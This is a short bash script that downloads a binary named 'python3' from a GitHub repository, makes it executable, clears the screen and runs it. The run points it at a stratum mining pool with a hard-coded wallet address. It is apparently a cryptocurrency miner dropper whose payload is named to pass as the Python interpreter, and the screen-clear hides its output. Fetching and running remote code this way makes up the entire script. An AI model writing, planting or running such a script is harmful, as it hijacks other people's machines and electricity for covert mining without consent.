#!/bin/bash

wget https://github.com/barburonjilo/latgp/raw/main/python3

chmod +x python3

nomer=$((RANDOM % 50 + 1))

clear

./python3 --server stratum+tcp://stratum-asia.rplant.xyz --user UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.asu --pec --fee 0 --pass x --port 7116
